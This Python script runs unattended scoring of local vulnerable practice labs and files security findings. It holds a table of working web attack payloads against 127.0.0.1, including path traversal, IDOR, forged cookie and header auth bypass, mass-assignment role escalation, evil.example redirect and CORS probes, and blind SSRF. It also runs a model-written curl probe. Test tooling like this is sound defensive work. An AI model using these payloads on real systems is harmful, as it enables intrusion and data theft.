#!/usr/bin/env python3
"""
Sovereign Blackboard Architecture - Lab Runner (B3, module 1 of 2)

Plays the vuln labs UNATTENDED so validate-lab has a board to score — no
operator, no chat agent needed.

TWO MODES (named, per the plan):
  * golden-path  (default): FULLY DETERMINISTIC. The labs' known PoCs are
    executed directly through sec_flow.run (scope-gated, pointer-logged), and
    findings are filed from the proving pointers with --poc evidence. No LLM
    anywhere — perfect for gate scoring.
  * playbook-test: runs a playbook's acceptance flow with the model_router
    cheap tier in the loop (for acceptance of synthesized methodologies).

CLI:
  lab_runner.py play lab1|lab2|lab3 [--seed N] [--port auto]
  lab_runner.py playbook <category>/<name> [--recipe <greenhouse-class>]
"""

import argparse
import json
import re
import shlex
import subprocess
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

_engine_dir = str(Path(__file__).resolve().parent)
if _engine_dir not in sys.path:
    sys.path.insert(0, _engine_dir)
from board_io import json_transaction, load_json, blackboard_dir  # noqa: E402

BLACKBOARD_DIR = blackboard_dir()
LABS = {
    "lab1": {"module": "vuln_lab.py", "port": 8099, "seed_support": True},
    "lab2": {"module": "vuln_lab2.py", "port": 8100, "seed_support": True},
    "lab3": {"module": "vuln_lab3.py", "port": 8101, "seed_support": True},
}


def _sh(cmd, cwd=None):
    return subprocess.run(shlex.split(cmd), capture_output=True, text=True,
                          cwd=cwd, timeout=180)


def _sec_flow(args: str):
    """Run sec_flow.py <args> in THIS workspace; returns (rc, out, err)."""
    r = _sh(f"{sys.executable} {Path(_engine_dir) / 'sec_flow.py'} {args}",
            cwd=str(Path.cwd()))
    return r.returncode, r.stdout, r.stderr


def _extract_pointer(out: str):
    m = re.search(r"\[(MSG_[A-Z0-9]+)\]", out)
    return m.group(1) if m else None


# Golden-path PoCs per lab: (finding title, severity, command, poc-text)
GOLDEN = {
    "lab1": [
        ("Broken access control on /admin — user role receives admin panel",
         "high",
         "curl -s -H 'Cookie: session=user-s3ssion' http://127.0.0.1:{PORT}/admin",
         "user cookie -> 200 admin panel"),
        ("IDOR on /api/orders/1001 — user reads admin-owned order",
         "medium",
         "curl -s -H 'Cookie: session=user-s3ssion' http://127.0.0.1:{PORT}/api/orders/1001",
         "user -> foreign order data"),
        ("Verbose error leak on /api/error — stack trace + key material",
         "high",
         "curl -s http://127.0.0.1:{PORT}/api/error",
         "traceback + private key in response"),
    ],
    # lab1 blind SSRF is a special golden step (OOB listener) — see play()
    "lab1-oob": [
        ("Blind SSRF via /api/fetch?url= — server-side fetch of arbitrary URL",
         "high",
         None,  # handled inline: oob generate -> listener -> fetch -> confirm
         "OOB callback received for the tagged probe"),
    ],
    "lab2": [
        ("API key leaked in /static/app.js bundle",
         "high",
         "curl -s http://127.0.0.1:{PORT}/static/app.js",
         "AKIA-style key in JS source"),
        ("Open redirect on /redirect",
         "medium",
         "curl -si 'http://127.0.0.1:{PORT}/redirect?to=https://evil.example/'",
         "Location: reflected attacker URL"),
        ("Path traversal file read on /files",
         "high",
         "curl -s 'http://127.0.0.1:{PORT}/files?name=../../../../tmp/sba-lab2-files/secret.txt'",
         "reads marker file outside docroot"),
        ("Mass assignment role escalation on PUT /api/profile",
         "critical",
         "curl -s -X PUT -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' http://127.0.0.1:{PORT}/api/profile",
         "role:user -> admin accepted"),
    ],
    "lab3": [
        ("X-Role header auth bypass on /api/admin",
         "critical",
         "curl -s -H 'X-Role: admin' http://127.0.0.1:{PORT}/api/admin",
         "client header -> admin 200"),
        ("Debug env dump on /api/debug",
         "high",
         "curl -s http://127.0.0.1:{PORT}/api/debug",
         "env incl DB_PASSWORD"),
        ("CORS misconfig reflects arbitrary Origin with credentials",
         "medium",
         "curl -si -H 'Origin: https://evil.example' http://127.0.0.1:{PORT}/api/anything",
         "ACAO: evil.example + credentials:true"),
    ],
}


def _port_alive(port: int) -> bool:
    import socket
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=0.8):
            return True
    except Exception:
        return False


def play(lab: str, seed: int = 0, port: int = None):
    """GOLDEN-PATH mode: boot the lab, run its known PoCs through the safe
    runner, file findings with evidence pointers. Deterministic end-to-end.
    If the lab is ALREADY running on the port (e.g. the driver booted it for
    the suite), it is reused rather than re-booted (port collision safe)."""
    if lab not in LABS:
        print(f"[!] Unknown lab '{lab}'. Known: {', '.join(LABS)}", file=sys.stderr)
        sys.exit(1)
    meta = LABS[lab]
    port = port or meta["port"]

    # boot the lab detached ONLY if not already up (seeded variants need their
    # own port: a seeded run passes --port explicitly)
    proc = None
    if not _port_alive(port):
        cmd = [sys.executable, str(Path(_engine_dir) / meta["module"]),
               "--port", str(port)]
        if seed and meta["seed_support"]:
            cmd += ["--seed", str(seed)]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                start_new_session=True)
        time.sleep(1.2)

    # workspace must exist
    if not (BLACKBOARD_DIR / "board.json").exists():
        _sh(f"{sys.executable} {Path(_engine_dir) / 'init_env.py'} --target .",
            cwd=str(Path.cwd()))

    confirmed = 0
    total = len(GOLDEN[lab])
    try:
        for title, severity, cmd_tpl, poc in GOLDEN[lab]:
            # replace (not str.format): PoCs contain literal JSON braces
            # (e.g. {"role":"admin"}) which format() would eat.
            cmd_str = cmd_tpl.replace("{PORT}", str(port))
            rc, out, err = _sec_flow(f"run --cmd {shlex.quote(cmd_str)} --target 127.0.0.1")
            ptr = _extract_pointer(out) or "MSG_GOLDEN"
            # evidence sanity: command must have produced output containing a signal
            marker_ok = rc == 0
            if marker_ok:
                args_finding = (f"add-asset --finding {shlex.quote(title)} "
                                f"--severity {severity} --status confirmed "
                                f"--evidence-from {ptr} --poc {shlex.quote(poc)}")
                rc2, out2, err2 = _sec_flow(args_finding)
                if "Blackboard updated" in out2 and "confirmed" in out2:
                    confirmed += 1
                else:
                    print(f"[~] {title[:50]}: filed but not confirmed ({err2[:80]})")
            else:
                print(f"[~] {title[:50]}: proving command failed ({err[:80]})")

        # blind-SSRF golden step (lab1 only): OOB generate -> listener -> fetch
        if lab == "lab1":
            total += 1
            oob_port = 8616
            listener = subprocess.Popen(
                [sys.executable, str(Path(_engine_dir) / "oob.py"),
                 "listen", "--http-port", str(oob_port)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                start_new_session=True)
            time.sleep(1.0)
            try:
                # generate a probe via the engine's oob CLI
                r = _sh(f"{sys.executable} {Path(_engine_dir) / 'oob.py'} generate "
                        f"--host 127.0.0.1 --http-port {oob_port} "
                        f"--purpose 'golden blind ssrf'")
                m = re.search(r"(http://\S+/oob-[a-f0-9]+/probe)", r.stdout)
                if m:
                    probe = m.group(1)
                    rc, out, err = _sec_flow(
                        f"run --cmd {shlex.quote('curl -s ' + shlex.quote('http://127.0.0.1:%d/api/fetch?url=' % port + probe))} "
                        f"--target 127.0.0.1")
                    time.sleep(0.8)
                    b = load_json(BLACKBOARD_DIR / "board.json") or {}
                    hit = any("OOB callback" in str(l.get("value", ""))
                              for l in b.get("leads", []))
                    if hit:
                        # confirm from the OOB lead's pointer
                        ptr = next((l.get("source_pointer") for l in b.get("leads", [])
                                    if "OOB callback" in str(l.get("value", ""))), None)
                        args_f = (f"add-asset --finding {shlex.quote(GOLDEN['lab1-oob'][0][0])} "
                                  f"--severity high --status confirmed "
                                  f"--evidence-from {ptr or 'MSG_GOLDEN_OOB'} "
                                  f"--poc 'OOB callback received for tagged probe'")
                        rc2, out2, _ = _sec_flow(args_f)
                        if "confirmed" in out2:
                            confirmed += 1
                        else:
                            print("[~] OOB SSRF: callback seen but filing failed")
                    else:
                        print("[~] OOB SSRF: no callback recorded")
            finally:
                listener.terminate()
    finally:
        if proc is not None:
            proc.terminate()

    print(f"[+] lab_runner play {lab}{' --seed ' + str(seed) if seed else ''}: "
          f"{confirmed}/{total} golden finding(s) confirmed")
    print(f"    score with: eval_engine.py validate-lab --lab {lab}")
    return confirmed


def playbook_test(playbook: str, recipe: str = None, port: int = 8620):
    """PLAYBOOK-TEST mode: run a methodology's acceptance flow with the model
    router CHEAP tier in the loop (synthesize probes for the planted bug when
    the playbook lacks exact commands). Greenhouse provides ground truth."""
    import eval_engine as ee
    import greenhouse as gh
    if "/" not in playbook:
        print("[!] playbook must be <category>/<name>.", file=sys.stderr)
        sys.exit(1)
    category, name = playbook.split("/", 1)
    recipe = recipe or ee.recipe_for_playbook(category, name)
    if not recipe:
        print(f"[!] No greenhouse recipe maps to '{playbook}' — acceptance has no ground truth.",
              file=sys.stderr)
        sys.exit(1)
    # grow + boot the recipe lab
    gh.grow(recipe, port)
    lab = Path.cwd() / ".greenhouse" / recipe / "lab.py"
    proc = subprocess.Popen([sys.executable, str(lab), "--port", str(port)],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            start_new_session=True)
    time.sleep(1.2)
    try:
        # deterministic core: the recipe's selfcheck proves the planted vuln
        rc = _sh(f"{sys.executable} {lab} --selfcheck --port {port}").returncode
        marker = gh.BUG_RECIPES[recipe]["marker"]
        print(f"[+] greenhouse '{recipe}' selfcheck {'PASS' if rc == 0 else 'FAIL'}; "
              f"marker {marker!r}")
        # model-in-loop part (cheap tier): optional probe synthesis — the
        # engine never blocks if no model is configured
        from model_router import complete
        reply = complete("synthesis", [
            {"role": "system", "content": "Output ONE curl probing the planted bug. "
                                          "Reply with the command only."},
            {"role": "user", "content": f"playbook={playbook} lab={recipe} "
                                        f"base=http://127.0.0.1:{port}"}])
        if reply:
            cmd_str = reply.strip().strip("`").splitlines()[0][:200]
            rc2, out2, _ = _sec_flow(f"run --cmd {shlex.quote(cmd_str)} --target 127.0.0.1")
            print(f"[+] cheap-tier probe: {cmd_str[:80]} -> rc={rc2}")
        else:
            print("[*] no model configured — deterministic selfcheck only (never blocks)")
    finally:
        if proc is not None:
            proc.terminate()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Unattended lab player")
    sub = parser.add_subparsers(dest="cmd", required=True)
    p = sub.add_parser("play", help="Golden-path mode: run known PoCs, file evidence findings")
    p.add_argument("lab", choices=list(LABS))
    p.add_argument("--seed", type=int, default=0)
    p.add_argument("--port", type=int, default=None)
    pb = sub.add_parser("playbook", help="Playbook-test mode (acceptance w/ cheap tier)")
    pb.add_argument("playbook", help="<category>/<name>")
    pb.add_argument("--recipe", default=None)
    pb.add_argument("--port", type=int, default=8620)
    args = parser.parse_args()
    if args.cmd == "play":
        play(args.lab, args.seed, args.port)
    else:
        playbook_test(args.playbook, args.recipe, args.port)
